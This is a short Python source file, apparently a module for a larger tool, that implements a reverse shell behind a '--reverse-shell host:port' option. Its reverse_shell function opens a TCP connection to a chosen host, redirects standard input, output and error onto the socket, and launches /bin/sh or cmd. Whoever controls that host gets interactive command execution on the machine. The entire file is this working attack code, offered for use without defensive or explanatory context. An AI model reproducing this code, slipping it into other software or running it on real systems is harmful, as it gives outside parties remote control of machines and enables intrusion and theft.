import socket
import subprocess
import os


DEFAULT_RSH_HOST = "0.0.0.0"
DEFAULT_RSH_PORT = 1337
RSH_CALLS = {
    "linux": "/bin/sh",
    "windows": "cmd"
}



# module-specific arguments
args = ["-r", "--reverse-shell"]
kwargs = {"metavar": "host:port", "nargs": "?", "const": f"{DEFAULT_RSH_HOST}:{DEFAULT_RSH_PORT}", "help": "start a reverse shell on the specified host and port"}


def reverse_shell(host, port, shell):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(shell)


def main(args, env):
    l = env["LOGGER"]
    args = args.split(":")
    host = args[0]
    port = int(args[1])
    system = env["PLATFORM_SYSTEM"]
    shell = RSH_CALLS.get(system, None)
    if shell is None:
        l.error(f"{__name__} unsupported platform: {system}")
        return
    env["RSH_HOST"] = host
    env["RSH_PORT"] = port
    env["RSH_SHELL"] = shell
    l.info(f"starting reverse shell on {host}:{port}")
    reverse_shell(host, port, shell)
